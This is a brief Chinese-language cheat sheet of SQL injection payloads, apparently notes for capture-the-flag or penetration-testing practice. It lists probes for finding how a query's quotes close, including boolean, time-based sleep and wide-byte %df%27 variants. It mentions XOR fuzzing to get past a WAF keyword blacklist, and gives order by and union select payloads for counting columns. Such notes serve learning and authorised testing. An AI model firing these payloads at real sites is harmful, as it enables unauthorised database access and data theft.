## 闭合判断
```
?id=1' 
?id=1" 
?id=1') 
?id=1") 
?id=1' or 1#
?id=1' or 0#
?id=1' or 1=1#
?id=1' and 1=2#
?id=1' and sleep(5)#
?id=1' and 1=2 or ' 
?id=1\
宽字节
%df%27
```

## 关键字fuzz
### 异或fuzz
基本原理：当waf过滤了对应关键字通过异或运算结果来改变页面反馈判断黑名单

## 字段数判断
使用 order/group by 语句，通过往后边拼接数字指导页面报错,确定字段数量
```mysql
1' order by 1#
1' order by 2#
1' order by 3#
1 order by 1
1 order by 2
1 order by 3
```
使用 union select 联合查询，不断在 union select 后面加数字，直到不报错，即可确定字段数量
```mysql
1' union select 1#
1' union select 1,2#
1' union select 1,2,3#
1 union select 1#
1 union select 1,2#
1 union select 1,2,3#
```